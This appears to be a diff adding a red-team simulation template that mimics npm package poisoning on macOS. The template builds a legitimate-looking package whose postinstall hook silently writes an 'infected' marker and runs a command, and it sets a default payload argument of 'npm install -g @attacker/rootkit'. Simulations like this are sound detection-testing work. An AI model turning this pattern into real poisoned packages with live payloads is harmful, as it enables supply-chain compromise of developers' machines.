@@ -1,0 +1,125 @@
+api_version: 2.0
+id: 550e8400-e29b-41d4-a716-446655440026
+platform: darwin
+name: Package manager poisoning
+category: Initial Access
+description: Simulate package manager poisoning attack. Attacker creates malicious packages with legitimate names in public package repositories (npm, PyPI, Homebrew, etc.) to distribute malware.
+tactics:
+  - T1195.002
+techniques:
+  - T1195.002
+args:
+  - name: package_name
+    description: Name of poisoned package
+    type: string
+    default: utility_lib
+  - name: version
+    description: Version number of poisoned package
+    type: string
+    default: "1.2.3"
+  - name: source_repo
+    description: Package repository URL
+    type: string
+    default: "https://registry.npmjs.org"
+  - name: backdoor_payload
+    description: Malware payload in package
+    type: string
+    default: "npm install -g @attacker/rootkit"
+steps:
+  - name: Create poisoned npm package structure
+    command: mkdir -p /tmp/ttpforge_npm/{{ package_name }}
+    
+  - name: Create legitimate-looking package.json
+    command: |
+      cat > /tmp/ttpforge_npm/{{ package_name }}/package.json << 'PKGJSON'
+      {
+        "name": "{{ package_name }}",
+        "version": "{{ version }}",
+        "description": "Utility library for common tasks",
+        "main": "index.js",
+        "scripts": {
+          "install": "node scripts/install.js",
+          "postinstall": "node scripts/postinstall.js"
+        },
+        "dependencies": {}
+      }
+      PKGJSON
+    
+  - name: Create legitimate code file
+    command: |
+      cat > /tmp/ttpforge_npm/{{ package_name }}/index.js << 'INDEXJS'
+      module.exports = {
+        version: "{{ version }}",
+        parse: function(data) {
+          return JSON.parse(data);
+        }
+      };
+      INDEXJS
+    
+  - name: Create malicious postinstall script
+    command: |
+      mkdir -p /tmp/ttpforge_npm/{{ package_name }}/scripts
+      cat > /tmp/ttpforge_npm/{{ package_name }}/scripts/postinstall.js << 'POSTINSTALL'
+      #!/usr/bin/env node
+      const fs = require('fs');
+      const os = require('os');
+      
+      // Silently create backdoor marker
+      const marker = os.homedir() + '/.{{ package_name }}_installed';
+      fs.writeFileSync(marker, 'infected', 'utf8');
+      
+      // Execute backdoor payload
+      const { execSync } = require('child_process');
+      try {
+        execSync("touch /tmp/.npm_poisoned", { stdio: 'pipe' });
+      } catch (e) {}
+      POSTINSTALL
+      chmod +x /tmp/ttpforge_npm/{{ package_name }}/scripts/postinstall.js
+    
+  - name: Create README to appear legitimate
+    command: |
+      cat > /tmp/ttpforge_npm/{{ package_name }}/README.md << 'README'
+      # {{ package_name }}
+      
+      A utility library for parsing and processing data structures.
+      
+      ## Installation
+      
+      npm install {{ package_name }}
+      
+      ## Usage
+      
+      const util = require('{{ package_name }}');
+      const result = util.parse(jsonData);
+      README
+    
+  - name: Simulate npm install of poisoned package
+    command: node /tmp/ttpforge_npm/{{ package_name }}/scripts/postinstall.js
+    dry_run: true
+
+checks:
+  - name: Verify poisoned package directory exists
+    command: test -d /tmp/ttpforge_npm/{{ package_name }}
+    expected_output: ""
+    
+  - name: Verify package.json contains malicious scripts
+    command: grep -q "postinstall" /tmp/ttpforge_npm/{{ package_name }}/package.json
+    expected_output: ""
+    
+  - name: Verify poisoned marker created
+    command: test -f /tmp/.npm_poisoned
+    expected_output: ""
+    
+  - name: Verify legitimate-looking files present
+    command: test -f /tmp/ttpforge_npm/{{ package_name }}/index.js
+    expected_output: ""
+
+tests:
+  dry_run: true
+
+cleanup:
+  - name: Remove poisoned npm package
+    command: rm -rf /tmp/ttpforge_npm/{{ package_name }}
+    
+  - name: Remove package marker files
+    command: rm -f /tmp/.npm_poisoned ~/.{{ package_name }}_installed
